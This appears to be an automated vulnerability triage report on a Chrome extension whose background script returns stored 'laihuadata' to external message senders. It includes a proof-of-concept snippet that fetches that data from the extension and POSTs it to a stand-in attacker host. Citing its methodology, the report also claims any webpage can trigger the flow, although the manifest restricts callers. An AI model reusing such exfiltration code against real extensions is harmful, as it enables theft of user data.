# CoCo Analysis: bbfdokkhbobhnbcimohialpohjijnkpc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bbfdokkhbobhnbcimohialpohjijnkpc/opgen_generated_files/bg.js
Line 751: `var storage_local_get_source = { 'key': 'value' };`
Line 979: `sendResponse(result.laihuadata);`

**Code:**

```javascript
// Background script - bg.js Line 975
chrome.runtime.onMessageExternal.addListener(function(message, sender, sendResponse) {
    if (message.type && (message.type == "FROM_PAGE")) {
        chrome.storage.local.get(['laihuadata'], function(result) {
            // Sends stored data back to external caller
            sendResponse(result.laihuadata); // ← information disclosure
            console.log('Value currently is ' + result.laihuadata);
        });
    }
    if (message.type && (message.type == "IS_INSTALLED")) {
      sendResponse(true);
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any webpage (attacker ignores manifest externally_connectable restrictions per methodology)
chrome.runtime.sendMessage(
  'bbfdokkhbobhnbcimohialpohjijnkpc',  // Extension ID
  {type: "FROM_PAGE"},
  function(response) {
    console.log("Stolen data from storage:", response);
    // Attacker can now exfiltrate the laihuadata to their server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({stolen: response})
    });
  }
);
```

**Impact:** Information disclosure vulnerability. An external attacker can retrieve the `laihuadata` value stored in `chrome.storage.local` by sending a message with `type: "FROM_PAGE"`. The extension responds with the stored data via `sendResponse()`, completing a storage exploitation chain (storage.get → sendResponseExternal). The attacker can read potentially sensitive data that the extension stores, including user information, tokens, or application data related to the LAiPIC.AI service.

**Note:** The manifest.json specifies `externally_connectable` with specific domain matches (lines 28-36), but per the methodology: "IGNORE manifest.json restrictions on message passing. If code has chrome.runtime.onMessageExternal, assume ANY attacker can trigger it. Even if only ONE specific domain/extension can exploit it → TRUE POSITIVE."
